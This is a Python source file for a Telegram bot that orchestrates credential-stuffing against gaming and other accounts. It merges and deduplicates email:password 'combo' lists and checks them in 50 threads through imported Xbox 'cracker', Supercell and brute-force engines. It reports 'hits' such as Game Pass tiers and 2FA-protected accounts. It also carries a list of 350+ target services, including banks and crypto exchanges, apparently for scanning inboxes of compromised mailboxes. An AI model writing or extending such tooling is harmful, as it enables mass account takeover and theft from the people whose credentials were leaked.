import os
import io
import sys
import threading
import time
import asyncio
import tempfile
import zipfile
import logging
import json
import re
import hashlib
import base64
import random
import string
import shutil
import warnings
import uuid
import requests
from datetime import datetime, timedelta
from typing import Dict, List, Tuple, Optional, Any, Union, Set
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock, RLock, Event
from functools import wraps
from collections import defaultdict

# Suppress SSL warnings early
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    InputFile, Bot, LabeledPrice, ShippingOption
)
from telegram.constants import ParseMode
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes, ConversationHandler,
    PreCheckoutQueryHandler
)
from telegram.error import TelegramError, BadRequest, NetworkError
from telegram.request import HTTPXRequest

# Import custom inbox engine
try:
    from custom_inbox_full import FullCustomInboxEngine
except ImportError:
    FullCustomInboxEngine = None

# Import Supercell engine
try:
    from supercell_engine import SupercellEngine, SupercellStats
except ImportError:
    SupercellEngine = None
    SupercellStats = None

# Import Xbox Cracker engine
try:
    from xbox_cracker_engine import XboxCrackerEngine, XboxCrackerStats
except ImportError:
    XboxCrackerEngine = None
    XboxCrackerStats = None

# Import Xbox Engine (Original)
try:
    from xbox_engine import XboxEngine, XboxStats as XboxEngineStats
except ImportError:
    XboxEngine = None
    XboxEngineStats = None

# Import File Merger
try:
    from file_merger import FilesMerger, CombinedCracker
except ImportError:
    FilesMerger = None
    CombinedCracker = None

logger = logging.getLogger(__name__)

# Suppress verbose logging
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)

# ==================== ERROR HANDLING UTILITIES ====================

class BotError(Exception):
    """Base exception for bot errors"""
    pass

class ScanError(BotError):
    """Scan operation error"""
    pass

class FileError(BotError):
    """File operation error"""
    pass

def handle_error(error: Exception, context: str = "", user_id: int = None) -> str:
    """
    Centralized error handling with logging and user-friendly messages
    """
    error_type = type(error).__name__
    error_msg = str(error)
    
    # Log with context
    if user_id:
        logger.error(f"[User {user_id}] {context} - {error_type}: {error_msg}")
    else:
        logger.error(f"{context} - {error_type}: {error_msg}")
    
    # User-friendly messages
    error_responses = {
        'FileNotFoundError': "❌ File not found or deleted",
        'PermissionError': "❌ Permission denied accessing file",
        'IOError': "❌ Error reading/writing file",
        'ValueError': "❌ Invalid data format",
        'KeyError': "❌ Missing required data",
        'Timeout': "❌ Operation timed out",
        'ConnectionError': "❌ Network connection error",
        'BadRequest': "❌ Invalid bot request",
        'TelegramError': "❌ Telegram API error",
    }
    
    for exc_type, msg in error_responses.items():
        if exc_type in error_type:
            return msg
    
    return f"❌ Error: {error_type}"

# ==================== GIVEAWAY MANAGER ====================
class GiveawayManager:
    """Manages giveaway operations for the bot"""
    def __init__(self, data_file: str = "giveaway_data.json"):
        self.data_file = data_file
        self.lock = Lock()
        self.data = self._load()

    def _load(self) -> dict:
        if os.path.exists(self.data_file):
            try:
                with open(self.data_file, 'r', encoding='utf-8') as f:
                    return json.load(f)
            except Exception as e:
                logger.error(f"Giveaway load error: {e}")
        return {
            "active": False,
            "keys": [],
            "participants": [],
            "winners": [],
            "created_at": None,
            "ended_at": None,
            "broadcast_count": 0
        }

    def _save(self):
        with self.lock:
            try:
                with open(self.data_file, 'w', encoding='utf-8') as f:
                    json.dump(self.data, f, indent=2, ensure_ascii=False)
            except Exception as e:
                logger.error(f"Giveaway save error: {e}")

    def is_active(self) -> bool:
        return self.data.get("active", False)

    def start_giveaway(self, keys: List[str]) -> bool:
        """Start a new giveaway with keys"""
        with self.lock:
            if self.is_active():
                return False
            if len(keys) < 1:
                return False
            self.data["active"] = True
            self.data["keys"] = keys
            self.data["participants"] = []
            self.data["winners"] = []
            self.data["created_at"] = datetime.now().isoformat()
            self.data["broadcast_count"] = 0
            self._save()
            return True

    def add_participant(self, user_id: int, first_name: str, username: Optional[str] = None) -> bool:
        """Add a participant to the giveaway"""
        with self.lock:
            if not self.is_active():
                return False
            # Check if already participated
            for p in self.data["participants"]:
                if p["user_id"] == user_id:
                    return False
            self.data["participants"].append({
                "user_id": user_id,
                "first_name": first_name,
                "username": username,
                "joined_at": datetime.now().isoformat()
            })
            self._save()
            return True

    def get_participants(self) -> List[dict]:
        with self.lock:
            return self.data.get("participants", []).copy()

    def get_participant_count(self) -> int:
        with self.lock:
            return len(self.data.get("participants", []))

    def get_keys(self) -> List[str]:
        with self.lock:
            return self.data.get("keys", []).copy()

    def end_giveaway(self) -> List[dict]:
        """End giveaway and select winners"""
        with self.lock:
            if not self.is_active():
                return []
            
            participants = self.data.get("participants", [])
            keys = self.data.get("keys", [])
            
            if not participants or not keys:
                return []
            
            # Select winners randomly
            num_winners = min(len(participants), len(keys))
            selected_winners = random.sample(participants, num_winners)
            
            # Assign keys to winners
            winners = []
            for i, winner in enumerate(selected_winners):
                winner["key"] = keys[i]
                winner["won_at"] = datetime.now().isoformat()
                winners.append(winner)
            
            self.data["winners"] = winners
            self.data["active"] = False
            self.data["ended_at"] = datetime.now().isoformat()
            self._save()
            
            return winners

    def get_wins(self) -> List[dict]:
        with self.lock:
            return self.data.get("winners", []).copy()

    def reset(self):
        """Reset giveaway data"""
        with self.lock:
            self.data = {
                "active": False,
                "keys": [],
                "participants": [],
                "winners": [],
                "created_at": None,
                "ended_at": None,
                "broadcast_count": 0
            }
            self._save()

    def get_status(self) -> dict:
        with self.lock:
            return {
                "active": self.data.get("active", False),
                "keys_count": len(self.data.get("keys", [])),
                "participants": len(self.data.get("participants", [])),
                "winners_count": len(self.data.get("winners", [])),
                "broadcast_count": self.data.get("broadcast_count", 0)
            }

    def increment_broadcast(self):
        """Increment broadcast count"""
        with self.lock:
            self.data["broadcast_count"] = self.data.get("broadcast_count", 0) + 1
            self._save()

# ==================== SUPERCELL MANAGER ====================
class SupercellManager:
    """Manages Supercell checking operations with statistics tracking"""
    def __init__(self):
        self.engine = SupercellEngine() if SupercellEngine else None
        self.lock = Lock()
        self.sessions = {}  # Track active checking sessions
        self.results = []  # Store all results
    
    def is_available(self) -> bool:
        """Check if Supercell engine is available"""
        return self.engine is not None
    
    def start_session(self, session_id: str, combo_file: str) -> bool:
        """Start a new checking session"""
        with self.lock:
            if session_id in self.sessions:
                return False
            
            self.sessions[session_id] = {
                "combo_file": combo_file,
                "started_at": datetime.now().isoformat(),
                "status": "running",
                "initial_stats": None,
                "final_stats": None
            }
            
            if self.engine:
                self.sessions[session_id]["initial_stats"] = self.engine.get_stats()
            
            return True
    
    def end_session(self, session_id: str) -> Optional[Dict[str, Any]]:
        """End a checking session and get results"""
        with self.lock:
            if session_id not in self.sessions:
                return None
            
            session = self.sessions[session_id]
            session["status"] = "completed"
            session["ended_at"] = datetime.now().isoformat()
            
            if self.engine:
                session["final_stats"] = self.engine.get_stats()
            
            return session
    
    def get_session_stats(self, session_id: str) -> Optional[Dict[str, Any]]:
        """Get current statistics for a session"""
        with self.lock:
            if session_id not in self.sessions or not self.engine:
                return None
            
            return self.engine.get_stats()
    
    def check_account(self, email: str, password: str) -> Optional[Dict[str, Any]]:
        """Check a single account for Supercell games"""
        if not self.engine:
            return None
        
        return self.engine.check_account(email, password)
    
    def get_global_stats(self) -> Optional[Dict[str, Any]]:
        """Get global statistics across all sessions"""
        if not self.engine:
            return None
        
        return self.engine.get_stats()
    
    def format_stats_report(self, stats: Dict[str, Any]) -> str:
        """Format statistics as a readable report"""
        if not stats:
            return "❌ No statistics available"
        
        report = (
            f"📊 **SUPERCELL CHECKING STATISTICS**\n\n"
            f"👥 **Total Checked:** {stats.get('total_checked', 0)}\n"
            f"✅ **Total Hits:** {stats.get('total_hits', 0)}\n"
            f"🎮 **Supercell Accounts:** {stats.get('supercell_hits', 0)}\n"
            f"📝 **Valid (No Games):** {stats.get('valid_accounts', 0)}\n"
            f"❌ **Bad Accounts:** {stats.get('bad_accounts', 0)}\n"
            f"⚠️  **Errors:** {stats.get('errors', 0)}\n\n"
            f"🎯 **Games Found:**\n"
            f"   • Clash Royale: {stats.get('games', {}).get('clash_royale', 0)}\n"
            f"   • Brawl Stars: {stats.get('games', {}).get('brawl_stars', 0)}\n"
            f"   • Clash of Clans: {stats.get('games', {}).get('clash_of_clans', 0)}\n"
            f"   • Hay Day: {stats.get('games', {}).get('hay_day', 0)}"
        )
        
        return report

# ==================== XBOX MANAGER (Legacy) ====================
class XboxManager:
    """Manages Xbox Game Pass checking operations with statistics tracking"""
    def __init__(self):
        self.engine = XboxCrackerEngine() if XboxCrackerEngine else None
        self.lock = Lock()
        self.sessions = {}  # Track active checking sessions
        self.results = []  # Store all results
    
    def is_available(self) -> bool:
        """Check if Xbox engine is available"""
        return self.engine is not None
    
    def start_session(self, session_id: str, combo_file: str) -> bool:
        """Start a new checking session"""
        with self.lock:
            if session_id in self.sessions:
                return False
            
            self.sessions[session_id] = {
                "combo_file": combo_file,
                "started_at": datetime.now().isoformat(),
                "status": "running",
                "initial_stats": None,
                "final_stats": None
            }
            
            if self.engine:
                self.sessions[session_id]["initial_stats"] = self.engine.get_stats()
            
            return True
    
    def end_session(self, session_id: str) -> Optional[Dict[str, Any]]:
        """End a checking session and get results"""
        with self.lock:
            if session_id not in self.sessions:
                return None
            
            session = self.sessions[session_id]
            session["status"] = "completed"
            session["ended_at"] = datetime.now().isoformat()
            
            if self.engine:
                session["final_stats"] = self.engine.get_stats()
            
            return session
    
    def get_session_stats(self, session_id: str) -> Optional[Dict[str, Any]]:
        """Get current statistics for a session"""
        with self.lock:
            if session_id not in self.sessions or not self.engine:
                return None
            
            return self.engine.get_stats()
    
    def check_account(self, email: str, password: str) -> Optional[Dict[str, Any]]:
        """Check a single account for Xbox/Minecraft subscriptions"""
        if not self.engine:
            return None
        
        return self.engine.check_account(email, password)
    
    def get_global_stats(self) -> Optional[Dict[str, Any]]:
        """Get global statistics across all sessions"""
        if not self.engine:
            return None
        
        return self.engine.get_stats()
    
    def format_stats_report(self, stats: Dict[str, Any]) -> str:
        """Format statistics as a readable report"""
        if not stats:
            return "❌ No statistics available"
        
        report = (
            f"📊 **XBOX GAME PASS CHECKING STATISTICS**\n\n"
            f"👥 **Total Checked:** {stats.get('total_checked', 0)}\n"
            f"✅ **Total Hits:** {stats.get('total_hits', 0)}\n"
            f"⛏  **Minecraft Hits:** {stats.get('minecraft_hits', 0)}\n"
            f"🎮 **Game Pass Hits:** {stats.get('gamepass_hits', 0)}\n"
            f"🕹  **Xbox Hits:** {stats.get('xbox_hits', 0)}\n"
            f"🔓 **Not Linked:** {stats.get('not_linked_hits', 0)}\n"
            f"🔒 **2FA Protected:** {stats.get('two_fa_accounts', 0)}\n"
            f"❌ **Bad Accounts:** {stats.get('bad_accounts', 0)}\n"
            f"⚠️  **Errors:** {stats.get('errors', 0)}\n"
            f"↺ **Retries:** {stats.get('retries', 0)}"
        )
        
        return report


# ==================== XBOX CRACKER MANAGER ====================
class XboxCrackerManager:
    """Manager for Xbox Cracker engine with session tracking"""
    
    def __init__(self):
        self.engine = XboxCrackerEngine() if XboxCrackerEngine else None
        self.lock = Lock()
        self.sessions = {}
    
    def start_session(self, session_id: str = None) -> Optional[str]:
        """Start new checking session"""
        if not self.engine:
            return None
        
        if not session_id:
            session_id = f"xbox_cracker_{int(time.time())}"
        
        with self.lock:
            self.sessions[session_id] = {
                "start_time": datetime.now(),
                "status": "active"
            }
        
        return session_id
    
    def end_session(self, session_id: str) -> Optional[Dict[str, Any]]:
        """End checking session and get final stats"""
        if not self.engine:
            return None
        
        with self.lock:
            if session_id in self.sessions:
                self.sessions[session_id]["status"] = "completed"
                self.sessions[session_id]["end_time"] = datetime.now()
        
        return self.get_session_stats(session_id)
    
    def get_session_stats(self, session_id: str) -> Optional[Dict[str, Any]]:
        """Get statistics for specific session"""
        if not self.engine:
            return None
        
        with self.lock:
            if session_id not in self.sessions:
                return None
            
            return self.engine.get_stats()
    
    def check_account(self, email: str, password: str) -> Optional[Dict[str, Any]]:
        """Check single Xbox account"""
        if not self.engine:
            return None
        
        return self.engine.check_account(email, password)
    
    def get_stats(self) -> Optional[Dict[str, Any]]:
        """Get current global statistics"""
        if not self.engine:
            return None
        
        return self.engine.get_stats()
    
    def format_stats_report(self, stats: Dict[str, Any]) -> str:
        """Format Xbox Cracker statistics for display"""
        if not stats:
            return "❌ No statistics available"
        
        report = (
            "📊 **XBOX CRACKER CHECKING STATISTICS**\n\n"
            f"👥 **Total Checked:** {stats.get('total_checked', 0)}\n"
            f"✅ **Total Hits:** {stats.get('total_hits', 0)}\n"
            f"🎮 **Premium Hits:** {stats.get('premium_hits', 0)}\n"
            f"💠 **Game Pass Ultimate:** {stats.get('gamepass_ultimate', 0)}\n"
            f"🖥  **Game Pass PC:** {stats.get('gamepass_pc', 0)}\n"
            f"🎯 **Game Pass Console:** {stats.get('gamepass_console', 0)}\n"
            f"⭐ **Game Pass Core:** {stats.get('gamepass_core', 0)}\n"
            f"🏆 **Other Game Pass:** {stats.get('gamepass_other', 0)}\n"
            f"📱 **Microsoft 365:** {stats.get('m365_hits', 0)}\n"
            f"🎁 **Free Accounts:** {stats.get('free_hits', 0)}\n"
            f"⏳ **Expired:** {stats.get('expired_hits', 0)}\n"
            f"❌ **Bad Accounts:** {stats.get('bad_accounts', 0)}\n"
            f"⚠️  **Errors:** {stats.get('errors', 0)}\n"
            f"⏱️  **Timeouts:** {stats.get('timeouts', 0)}"
        )
        
        return report


# ==================== FILE MERGER & COMBINED CRACKER ====================
class MergerManager:
    """Manager for merging multiple combo files and cracking with engines"""
    
    def __init__(self):
        self.merger = FilesMerger() if FilesMerger else None
        self.cracker = CombinedCracker() if CombinedCracker else None
        self.lock = Lock()
        self.active_sessions = {}
    
    def merge_files(self, file_paths: List[str]) -> Dict[str, any]:
        """Merge multiple files and return statistics"""
        if not self.merger:
            return {"status": "error", "message": "Merger not available"}
        
        with self.lock:
            try:
                result = self.merger.merge_files(file_paths, remove_duplicates=True)
                return result
            except Exception as e:
                return {"status": "error", "message": str(e)}
    
    def merge_and_crack_supercell(self, file_paths: List[str], threads: int = 50) -> Dict[str, any]:
        """Merge files and start Supercell checking"""
        if not self.cracker:
            return {"status": "error", "message": "Cracker not available"}
        
        session_id = f"supercell_{int(time.time())}"
        with self.lock:
            self.active_sessions[session_id] = {
                "engine": "supercell",
                "start_time": datetime.now(),
                "status": "running",
                "file_count": len(file_paths)
            }
        
        try:
            result = self.cracker.merge_and_crack_supercell(file_paths, threads)
            with self.lock:
                self.active_sessions[session_id]["status"] = "completed"
                self.active_sessions[session_id]["end_time"] = datetime.now()
            return result
        except Exception as e:
            with self.lock:
                self.active_sessions[session_id]["status"] = "error"
            return {"status": "error", "message": str(e)}
    
    def merge_and_crack_xbox(self, file_paths: List[str], threads: int = 50) -> Dict[str, any]:
        """Merge files and start Xbox checking"""
        if not self.cracker:
            return {"status": "error", "message": "Cracker not available"}
        
        session_id = f"xbox_{int(time.time())}"
        with self.lock:
            self.active_sessions[session_id] = {
                "engine": "xbox",
                "start_time": datetime.now(),
                "status": "running",
                "file_count": len(file_paths)
            }
        
        try:
            result = self.cracker.merge_and_crack_xbox(file_paths, threads)
            with self.lock:
                self.active_sessions[session_id]["status"] = "completed"
                self.active_sessions[session_id]["end_time"] = datetime.now()
            return result
        except Exception as e:
            with self.lock:
                self.active_sessions[session_id]["status"] = "error"
            return {"status": "error", "message": str(e)}
    
    def get_active_sessions(self) -> Dict[str, any]:
        """Get all active merge sessions"""
        with self.lock:
            return dict(self.active_sessions)
    
    def format_merge_stats(self, merge_result: Dict[str, any]) -> str:
        """Format merge statistics for display"""
        if merge_result.get("status") != "success":
            return f"❌ Merge failed: {merge_result.get('message', 'Unknown error')}"
        
        stats = merge_result.get("stats", {})
        report = (
            "📊 **MERGE STATISTICS**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📁 Files merged: {stats.get('files_merged', 0)}\n"
            f"✅ Total loaded: {stats.get('total_loaded', 0)}\n"
            f"❌ Invalid combos: {stats.get('total_invalid', 0)}\n"
            f"🔀 Duplicates removed: {stats.get('duplicates_removed', 0)}\n"
            f"📊 Final combos: {stats.get('final_count', 0)}\n"
            f"📁 Output: `{stats.get('merged_file', 'N/A')}`"
        )
        return report


# ==================== UNIVERSAL MERGER FOR ANY ENGINE ====================
class UniversalMerger:
    """Universal file merger that works with any engine"""
    
    def __init__(self):
        self.merger = FilesMerger() if FilesMerger else None
        self.lock = Lock()
        self.sessions = {}
    
    def merge_files(self, file_paths: List[str], remove_duplicates: bool = True) -> Dict[str, any]:
        """Merge multiple files with deduplication"""
        if not self.merger:
            return {"status": "error", "message": "Merger not available"}
        
        with self.lock:
            try:
                result = self.merger.merge_files(file_paths, remove_duplicates=remove_duplicates)
                return result
            except Exception as e:
                return {"status": "error", "message": str(e)}
    
    def merge_and_crack(self, file_paths: List[str], engine_name: str, 
                       engine_instance, threads: int = 50) -> Dict[str, any]:
        """
        Universal merge and crack for any engine
        
        Args:
            file_paths: List of combo files to merge
            engine_name: Name of engine (supercell, xbox, etc)
            engine_instance: Engine object with check_account method
            threads: Number of threads to use
        """
        if not self.merger:
            return {"status": "error", "message": "Merger not available"}
        
        if not engine_instance:
            return {"status": "error", "message": f"{engine_name} engine not available"}
        
        try:
            # Merge files
            merge_result = self.merge_files(file_paths, remove_duplicates=True)
            
            if merge_result.get("status") != "success":
                return merge_result
            
            merged_file = merge_result["output_file"]
            combo_count = merge_result["combo_count"]
            
            # Load combos from merged file
            combos = []
            with open(merged_file, 'r', encoding='utf-8') as f:
                combos = [line.strip() for line in f if ':' in line.strip()]
            
            # Check with engine
            checked = 0
            results = []
            
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {
                    executor.submit(engine_instance.check_account,
                                  email.split(':')[0],
                                  ':'.join(email.split(':')[1:])): email
                    for email in combos
                }
                
                for future in as_completed(futures):
                    try:
                        result = future.result(timeout=30)
                        if result:
                            results.append(result)
                    except Exception:
                        pass
                    finally:
                        checked += 1
            
            # Get final statistics
            try:
                final_stats = engine_instance.get_stats()
            except:
                final_stats = {}
            
            return {
                "status": "completed",
                "engine": engine_name,
                "merged_file": merged_file,
                "merge_stats": merge_result.get("stats", {}),
                "total_checked": checked,
                "total_combos": combo_count,
                "results": results,
                "statistics": final_stats
            }
        
        except Exception as e:
            return {"status": "error", "message": str(e)}
    
    def format_result(self, result: Dict[str, any]) -> str:
        """Format result for display"""
        if result.get("status") != "completed":
            return f"❌ Error: {result.get('message', 'Unknown error')}"
        
        merge_stats = result.get("merge_stats", {})
        engine_stats = result.get("statistics", {})
        
        report = (
            f"✅ **{result['engine'].upper()} MERGE & CRACK COMPLETE**\n\n"
            f"📊 **MERGE STATS**\n"
            f"Files: {merge_stats.get('files_merged', 0)}\n"
            f"Duplicates removed: {merge_stats.get('duplicates_removed', 0)}\n"
            f"Final combos: {merge_stats.get('final_count', 0)}\n\n"
            f"🎯 **CRACK STATS**\n"
            f"Checked: {result.get('total_checked', 0)}\n"
            f"Hits: {engine_stats.get('total_hits', 0)}\n"
            f"Valid: {engine_stats.get('valid_accounts', 0)}\n"
            f"Bad: {engine_stats.get('bad_accounts', 0)}\n"
            f"Errors: {engine_stats.get('errors', 0)}"
        )
        return report

# ==================== ENGINE IMPORTS WITH FALLBACK STUBS ====================
try:
    from scanner_engine import ScannerEngine, ProxyManager as ScannerProxyManager, SERVICES_ALL, ALL_SERVICES, extract_profile_info, extract_psn_details
except ImportError:
    # Will use HotmailChecker-based ScannerEngine defined below
    ScannerProxyManager = None
    
    # ==================== COMPLETE SERVICES DATABASE (350+ SERVICES) ====================
    SERVICES_ALL = {
        # ═══ SOCIAL MEDIA (40) ═══
        "Facebook": ["facebookmail.com", "facebook.com"],
        "Instagram": ["mail.instagram.com", "instagram.com"],
        "TikTok": ["account.tiktok.com", "tiktok.com"],
        "Twitter/X": ["x.com", "twitter.com"],
        "LinkedIn": ["linkedin.com"],
        "Snapchat": ["snapchat.com"],
        "Discord": ["discord.com"],
        "Telegram": ["telegram.org"],
        "WhatsApp": ["whatsapp.com"],
        "Pinterest": ["pinterest.com"],
        "Reddit": ["reddit.com"],
        "Tumblr": ["tumblr.com"],
        "WeChat": ["wechat.com"],
        "Line": ["line.me"],
        "Viber": ["viber.com"],
        "Kik": ["kik.com"],
        "Skype": ["skype.com"],
        "Zoom": ["zoom.us"],
        "Microsoft Teams": ["teams.microsoft.com"],
        "Slack": ["slack.com"],
        "Mastodon": ["mastodon.social"],
        "Threads": ["threads.net"],
        "BeReal": ["bereal.com"],
        "Clubhouse": ["clubhouse.com"],
        "Twitch": ["twitch.tv"],
        "YouTube": ["youtube.com"],
        "Vimeo": ["vimeo.com"],
        "Dailymotion": ["dailymotion.com"],
        "Quora": ["quora.com"],
        "Medium": ["medium.com"],
        "Substack": ["substack.com"],
        "Patreon": ["patreon.com"],
        "Ko-fi": ["ko-fi.com"],
        "OnlyFans": ["onlyfans.com"],
        "Fanhouse": ["fanhouse.app"],
        "Meetup": ["meetup.com"],
        "Nextdoor": ["nextdoor.com"],
        "Yelp": ["yelp.com"],
        "Foursquare": ["foursquare.com"],
        "9GAG": ["9gag.com"],
        
        # ═══ GAMING (60) ═══
        "Steam": ["steampowered.com", "steam.com"],
        "Xbox": ["xbox.com"],
        "PlayStation": ["playstation.com"],
        "Nintendo": ["nintendo.net"],
        "Epic Games": ["epicgames.com"],
        "EA Sports": ["ea.com"],
        "Ubisoft": ["ubisoft.com"],
        "Activision": ["activision.com"],
        "Blizzard": ["blizzard.com"],
        "Riot Games": ["riotgames.com"],
        "Roblox": ["roblox.com"],
        "Minecraft": ["mojang.com", "minecraft.net"],
        "Fortnite": ["epicgames.com"],
        "Valorant": ["riotgames.com"],
        "League of Legends": ["leagueoflegends.com"],
        "Apex Legends": ["ea.com"],
        "Call of Duty": ["callofduty.com"],
        "PUBG": ["pubg.com", "pubgmobile.com"],
        "Free Fire": ["freefire.com", "garena.com"],
        "Genshin Impact": ["hoyoverse.com", "genshinimpact.com"],
        "Honkai Star Rail": ["hoyoverse.com"],
        "Mobile Legends": ["moonton.com"],
        "Clash of Clans": ["clashofclans.com"],
        "Clash Royale": ["clashroyale.com"],
        "Brawl Stars": ["brawlstars.com"],
        "Among Us": ["innersloth.com"],
        "Fall Guys": ["epicgames.com"],
        "Rocket League": ["epicgames.com"],
        "FIFA": ["ea.com"],
        "Madden NFL": ["ea.com"],
        "NBA 2K": ["2k.com"],
        "GTA V": ["rockstargames.com"],
        "Red Dead": ["rockstargames.com"],
        "The Sims": ["ea.com"],
        "Battlefield": ["ea.com"],
        "Overwatch": ["blizzard.com"],
        "World of Warcraft": ["blizzard.com"],
        "Hearthstone": ["blizzard.com"],
        "Diablo": ["blizzard.com"],
        "Destiny": ["bungie.net"],
        "Halo": ["xbox.com"],
        "Counter-Strike": ["steampowered.com"],
        "Dota 2": ["steampowered.com"],
        "Rainbow Six": ["ubisoft.com"],
        "Assassin's Creed": ["ubisoft.com"],
        "Far Cry": ["ubisoft.com"],
        "Watch Dogs": ["ubisoft.com"],
        "Warframe": ["warframe.com"],
        "Paladins": ["hirezstudios.com"],
        "Smite": ["hirezstudios.com"],
        "Rogue Company": ["hirezstudios.com"],
        "War Thunder": ["gaijin.net"],
        "World of Tanks": ["wargaming.net"],
        "Crossfire": ["z8games.com"],
        "Garena": ["garena.com"],
        "Cookie Run": ["devsisters.com"],
        "Candy Crush": ["king.com"],
        "Pokémon GO": ["nianticlabs.com"],
        "RAID Shadow": ["plarium.com"],
        "AFK Arena": ["lilithgames.com"],
        "Supercell": ["supercell.com"],
        "Midasbuy": ["midasbuy.com"],
        
        # ═══ STREAMING (35) ═══
        "Netflix": ["account.netflix.com", "netflix.com"],
        "Spotify": ["spotify.com"],
        "Disney+": ["disneyplus.com"],
        "HBO Max": ["hbomax.com"],
        "Amazon Prime": ["primevideo.com"],
        "YouTube Premium": ["youtube.com"],
        "Apple TV+": ["apple.com"],
        "Apple Music": ["apple.com"],
        "Hulu": ["hulu.com"],
        "Paramount+": ["paramountplus.com"],
        "Peacock": ["peacocktv.com"],
        "Discovery+": ["discoveryplus.com"],
        "Crunchyroll": ["crunchyroll.com"],
        "Funimation": ["funimation.com"],
        "VRV": ["vrv.co"],
        "Tidal": ["tidal.com"],
        "Deezer": ["deezer.com"],
        "SoundCloud": ["soundcloud.com"],
        "Pandora": ["pandora.com"],
        "iHeartRadio": ["iheart.com"],
        "Audible": ["audible.com"],
        "Scribd": ["scribd.com"],
        "Kindle Unlimited": ["amazon.com"],
        "ESPN+": ["espn.com"],
        "DAZN": ["dazn.com"],
        "Showtime": ["showtime.com"],
        "Starz": ["starz.com"],
        "Cinemax": ["cinemax.com"],
        "Pluto TV": ["pluto.tv"],
        "Tubi": ["tubi.tv"],
        "Vudu": ["vudu.com"],
        "Plex": ["plex.tv"],
        "Emby": ["emby.media"],
        "Jellyfin": ["jellyfin.org"],
        "Kodi": ["kodi.tv"],
        
        # ═══ SHOPPING (40) ═══
        "Amazon": ["amazon.com"],
        "eBay": ["ebay.com"],
        "AliExpress": ["aliexpress.com"],
        "Walmart": ["walmart.com"],
        "Target": ["target.com"],
        "Best Buy": ["bestbuy.com"],
        "Newegg": ["newegg.com"],
        "Etsy": ["etsy.com"],
        "Wish": ["wish.com"],
        "Shein": ["shein.com"],
        "Temu": ["temu.com"],
        "Shopee": ["shopee.com"],
        "Lazada": ["lazada.com"],
        "Zalando": ["zalando.com"],
        "ASOS": ["asos.com"],
        "Nike": ["nike.com"],
        "Adidas": ["adidas.com"],
        "Zara": ["zara.com"],
        "H&M": ["hm.com"],
        "Uniqlo": ["uniqlo.com"],
        "Forever 21": ["forever21.com"],
        "Gap": ["gap.com"],
        "Old Navy": ["oldnavy.com"],
        "Macy's": ["macys.com"],
        "Nordstrom": ["nordstrom.com"],
        "Sephora": ["sephora.com"],
        "Ulta": ["ulta.com"],
        "Home Depot": ["homedepot.com"],
        "Lowe's": ["lowes.com"],
        "IKEA": ["ikea.com"],
        "Wayfair": ["wayfair.com"],
        "Overstock": ["overstock.com"],
        "Zappos": ["zappos.com"],
        "Foot Locker": ["footlocker.com"],
        "StockX": ["stockx.com"],
        "GOAT": ["goat.com"],
        "Farfetch": ["farfetch.com"],
        "Depop": ["depop.com"],
        "Poshmark": ["poshmark.com"],
        "Mercari": ["mercari.com"],
        
        # ═══ FINANCE & CRYPTO (30) ═══
        "PayPal": ["paypal.com"],
        "Venmo": ["venmo.com"],
        "Cash App": ["cash.app"],
        "Zelle": ["zellepay.com"],
        "Stripe": ["stripe.com"],
        "Square": ["square.com"],
        "Binance": ["binance.com"],
        "Coinbase": ["coinbase.com"],
        "Kraken": ["kraken.com"],
        "Crypto.com": ["crypto.com"],
        "KuCoin": ["kucoin.com"],
        "Bitfinex": ["bitfinex.com"],
        "Gemini": ["gemini.com"],
        "Bitstamp": ["bitstamp.net"],
        "OKX": ["okx.com"],
        "Bybit": ["bybit.com"],
        "Huobi": ["huobi.com"],
        "Revolut": ["revolut.com"],
        "Wise": ["wise.com"],
        "Skrill": ["skrill.com"],
        "Neteller": ["neteller.com"],
        "Payoneer": ["payoneer.com"],
        "WebMoney": ["webmoney.ru"],
        "Perfect Money": ["perfectmoney.is"],
        "Robinhood": ["robinhood.com"],
        "eToro": ["etoro.com"],
        "TD Ameritrade": ["tdameritrade.com"],
        "Fidelity": ["fidelity.com"],
        "Charles Schwab": ["schwab.com"],
        "Interactive Brokers": ["ibkr.com"],
        
        # ═══ AI PLATFORMS (25) ═══
        "ChatGPT": ["openai.com"],
        "OpenAI": ["openai.com"],
        "Claude AI": ["anthropic.com"],
        "Anthropic": ["anthropic.com"],
        "Google Gemini": ["google.com"],
        "Google Bard": ["google.com"],
        "Microsoft Copilot": ["microsoft.com"],
        "Bing AI": ["microsoft.com"],
        "Grok": ["x.ai"],
        "Perplexity AI": ["perplexity.ai"],
        "DeepSeek": ["deepseek.com"],
        "Poe": ["poe.com"],
        "Character.AI": ["character.ai"],
        "Replika": ["replika.ai"],
        "Jasper": ["jasper.ai"],
        "Copy.ai": ["copy.ai"],
        "Writesonic": ["writesonic.com"],
        "Notion AI": ["makenotion.com"],
        "Grammarly": ["grammarly.com"],
        "QuillBot": ["quillbot.com"],
        "Midjourney": ["midjourney.com"],
        "DALL-E": ["openai.com"],
        "Stable Diffusion": ["stability.ai"],
        "Runway": ["runwayml.com"],
        "ElevenLabs": ["elevenlabs.io"],
        
        # ═══ EDUCATION (20) ═══
        "Udemy": ["udemy.com"],
        "Coursera": ["coursera.org"],
        "edX": ["edx.org"],
        "Khan Academy": ["khanacademy.org"],
        "Skillshare": ["skillshare.com"],
        "LinkedIn Learning": ["linkedin.com"],
        "Pluralsight": ["pluralsight.com"],
        "DataCamp": ["datacamp.com"],
        "Codecademy": ["codecademy.com"],
        "Duolingo": ["duolingo.com"],
        "Babbel": ["babbel.com"],
        "Rosetta Stone": ["rosettastone.com"],
        "Memrise": ["memrise.com"],
        "Brilliant": ["brilliant.org"],
        "MasterClass": ["masterclass.com"],
        "Domestika": ["domestika.org"],
        "CreativeLive": ["creativelive.com"],
        "Udacity": ["udacity.com"],
        "FutureLearn": ["futurelearn.com"],
        "Great Courses Plus": ["thegreatcoursesplus.com"],
    }
    
    # Flat list of all services for keyword selection
    ALL_SERVICES = list(SERVICES_ALL.keys())

try:
    from brute_root import BruteEngine, BruteValidator, BruteProxyManager
except ImportError:
    class BruteEngine:
        def validate_single(self, email, password): return "ERROR"
